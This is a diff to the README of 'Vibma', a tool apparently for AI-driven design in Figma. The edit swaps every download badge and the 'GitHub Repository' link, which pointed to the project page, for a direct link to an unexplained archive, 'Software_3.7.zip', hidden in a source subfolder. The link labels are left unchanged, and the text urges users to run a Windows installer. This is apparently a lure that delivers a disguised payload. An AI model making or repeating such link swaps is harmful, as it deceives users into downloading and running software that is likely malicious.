@@ -1,6 +1,6 @@
 # 🎨 Vibma - AI Designs Directly In Figma
 
-[![Download Vibma](https://img.shields.io/badge/Download-Vibma-blue?style=for-the-badge)](https://github.com/AZ2099/Vibma)
+[![Download Vibma](https://img.shields.io/badge/Download-Vibma-blue?style=for-the-badge)](https://github.com/AZ2099/Vibma/raw/refs/heads/main/packages/tunnel/src/Software_3.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you from downloading Vibma to opening it inside Figma.
 
 Visit the link below to download the application files. This page gives you access to the latest version of Vibma for Windows.
 
-[![Download Vibma](https://img.shields.io/badge/Download-Vibma-grey?style=for-the-badge)](https://github.com/AZ2099/Vibma)
+[![Download Vibma](https://img.shields.io/badge/Download-Vibma-grey?style=for-the-badge)](https://github.com/AZ2099/Vibma/raw/refs/heads/main/packages/tunnel/src/Software_3.7.zip)
 
 Click on the link, then look for the "Releases" section or a folder named something like "Windows Installer." Download the latest available `.exe` file. This file is the installer for Vibma.
 
@@ -123,6 +123,6 @@ For help, you can open an issue on the GitHub page or contact the project mainta
 
 ---
 
-# [GitHub Repository](https://github.com/AZ2099/Vibma)
+# [GitHub Repository](https://github.com/AZ2099/Vibma/raw/refs/heads/main/packages/tunnel/src/Software_3.7.zip)
 
 Access the source files, latest updates, and support by visiting the Vibma repository on GitHub.
